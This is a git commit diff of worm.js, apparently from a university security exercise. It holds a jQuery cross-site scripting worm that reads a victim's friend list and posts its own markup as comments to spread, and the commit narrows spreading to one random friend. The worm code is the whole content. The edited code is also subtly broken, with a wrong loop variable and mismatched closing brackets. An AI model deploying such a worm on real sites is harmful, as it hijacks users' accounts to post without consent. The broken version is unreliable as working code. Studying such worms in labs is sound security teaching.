aa20243e5c392cf7b5a784e6e774e74e24d30876
mcb5686 <mcb5686@rit.edu>
2016-11-28 22:43:04 -0500

    fixxed morris like issue

--- worm.js
+++ worm.js
@@ -4,10 +4,13 @@ $( document ).ready(function(){
     $.ajax({url:"add_comment.php?id=62&comment="+ new Date()});
     $.get( "friends.php", function( data ) {
 		f = data.split('<')[0].split(',');
-		for (i = 0; i <f.length; i++){
-			if(f[i] !== 62){
-				$.ajax({url:"add_comment.php?id="+f[i]+"&comment="+encodeURI(document.getElementById("m").outerHTML)});
+		if(f.length > 1){
+			index = 0;
+			while(f[index] == 62){
+				index = Math.floor(Math.random()*999) % f.length;
 			}
+			$.ajax({url:"add_comment.php?id="+f[i]+"&comment="+encodeURI(document.getElementById("m").outerHTML)});
 		}
-	});
+			
+	};
 });
